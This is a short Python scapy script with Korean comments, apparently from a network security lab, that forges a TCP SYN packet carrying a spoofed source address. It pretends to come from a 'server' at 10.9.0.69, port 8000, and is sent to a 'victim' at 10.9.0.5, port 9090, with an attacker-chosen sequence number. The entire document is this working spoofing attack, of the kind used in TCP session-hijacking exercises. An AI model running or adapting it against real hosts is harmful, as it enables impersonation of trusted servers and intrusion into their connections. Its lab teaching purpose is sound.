from scapy.all import *
x_ip = "10.9.0.5" # 피해자 IP 주소
x_port = 9090 # 피해자 포트
srv_ip = "10.9.0.69" # 서버의 IP 주소
srv_port = 8000 # 서버 포트
syn_seq = 0x1000 # 공격자가 사용할 TCP 시퀀스 번호

ip = IP(src=srv_ip, dst=x_ip)
tcp = TCP(sport=srv_port, dport=x_port,
          seq = syn_seq,
          flags = 'S')

send(ip/tcp, verbose = 1, iface='eth0')